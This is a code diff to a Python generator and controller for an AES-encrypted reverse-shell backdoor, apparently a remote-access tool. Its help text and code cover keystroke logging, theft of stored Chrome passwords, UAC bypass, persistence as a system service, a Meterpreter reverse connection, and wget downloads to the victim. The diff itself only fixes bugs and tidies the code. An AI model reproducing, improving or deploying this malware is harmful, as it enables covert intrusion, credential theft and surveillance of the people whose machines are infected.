@@ -1,7 +1,7 @@
 #!/usr/bin/python
 
 from Crypto.Cipher import AES
-import base64, random, string, sys, re, os
+import base64, random, string, sys, os
 
 BLOCK_SIZE, PADDING = 32, '{'
 
@@ -41,7 +41,7 @@ part1 = '''#def fscreenshot():
 def Wget(file):
 	down = urllib2.urlopen(file)
 	filename = file.split('/')[-1]
-	with open(pwd + os.sep + filename,'wb') as o:
+	with open(pwd.strip('**r') + os.sep + filename,'wb') as o:
 		o.write(down.read())
 
 def MeterDrop(mhost, mport):
@@ -382,11 +382,11 @@ while 1:
 
 	elif decrypted.startswith("wget "):
 		try:
-			file = decrypted.split(' ')[1]
-			Wget(file)
-			encrypted = EncodeAES(cipher, " [*] %s downloaded.**nEOFEOFEOFEOFEOFX" % (file.split('/')[-1]))
+			url = decrypted.split(' ')[1]
+			Wget(url)
+			encrypted = EncodeAES(cipher, " [*] %s downloaded.**nEOFEOFEOFEOFEOFX" % (url.split('/')[-1]))
 		except Exception as e:
-			encrypted = EncodeAES(cipher, " [X] Could not find %s.**nEOFEOFEOFEOFEOFX" % (e))
+			encrypted = EncodeAES(cipher, " [X] Could not download %s.**nEOFEOFEOFEOFEOFX" % (e))
 		s.send(encrypted)
 
 	elif decrypted.startswith("EOFEOFEOFEOFEOFS"):
@@ -423,7 +423,8 @@ while 1:
 		encrypted = EncodeAES(cipher, result)
 		s.send(encrypted)
 
-s.close()'''
+s.close()
+'''
 try:
 	hostname, portnumber = sys.argv[1], sys.argv[2]
 except:
@@ -440,7 +441,6 @@ try:
 		print ' [*] Auto-persistence enabled.'
 	else:
 		finalbackdoor = part1 + part2
-		exit()
 except:
 	finalbackdoor = part1 + part2
 
@@ -485,6 +485,7 @@ def fnextcmd():
 			nextcmd = raw_input("[AES-shell]>")
 	except:
 		print
+		c.close()
 		exit()
 
 	if nextcmd.startswith('bypassuac'):
@@ -572,12 +573,12 @@ def fmainloop(first):
 				continue
 
 def fhelp():
-	return '**n AES-shell options:**n  download file       -  Download a file from remote pwd to localhost.**n  upload filepath     -  Upload a filepath to remote pwd.**n  run commands        -  Run a command in the background.**n  wget url            -  Download a file from url to pwd.**n**n Windows Only:**n  persistence         -  Install exe as a system service backdoor.**n  meterpreter ip:port -  Execute a reverse_tcp meterpreter to ip:port.**n  keyscan             -  Start recording keystrokes.**n  keydump             -  Dump recorded keystrokes.**n  keyclear            -  Clear the keystroke buffer.**n  chromepass          -  Retrieve chrome stored passwords.**n  bypassuac cmds      -  Run commands as admin.**n'
+	return '**n AES-shell options:**n  download file       -  Download a file from remote pwd to localhost.**n  upload filepath     -  Upload a filepath to remote pwd.**n  run commands        -  Run a command in the background.**n  wget url            -  Download a file from url to remote pwd.**n**n Windows Only:**n  persistence         -  Install exe as a system service backdoor.**n  meterpreter ip:port -  Execute a reverse_tcp meterpreter to ip:port.**n  keyscan             -  Start recording keystrokes.**n  keydump             -  Dump recorded keystrokes.**n  keyclear            -  Clear the keystroke buffer.**n  chromepass          -  Retrieve chrome stored passwords.**n  bypassuac cmds      -  Run commands as admin.**n'
 
 commands = ['download ', 'upload ', 'meterpreter ', 'keyscan', 'keydump', 'keyclear', 'run ', 'chromepass', 'help', 'bypassuac ', 'persistence', 'wget ']
 readline.parse_and_bind("tab: complete")
 readline.set_completer(completer)
-BLOCK_SIZE, PADDING = 32, '{'
+BLOCK_SIZE, PADDING, cfrom = 32, '{', ' '
 pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
 EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
 DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))
@@ -599,8 +600,8 @@ while True:
 			data = data[18:]
 			isProxied = True
 		decrypted = DecodeAES(cipher, data)
-	except Exception as e:
-		print str(e)
+	except:
+		pass
 	if decrypted.endswith("EOFEOFEOFEOFEOFX"):
 		print decrypted[:-16]
 		fnextcmd()
@@ -627,9 +628,9 @@ while True:
 				uservar = 'not Admin'
 
 		if isProxied:
-			print ' [*] AES-Encrypted connection established with %s:%s (Proxy)' % (address[0], address[1])
-		else:
-			print ' [*] AES-Encrypted connection established with %s:%s' % (address[0], address[1])
+			cfrom = ' (Proxy)'
+
+		print ' [*] AES-Encrypted connection established with %s:%s%s' % (address[0], address[1], cfrom)
 		print ' [*] User is %s, System is %s %s.**n' % (uservar, archvar, opsys)
 		fnextcmd()
 
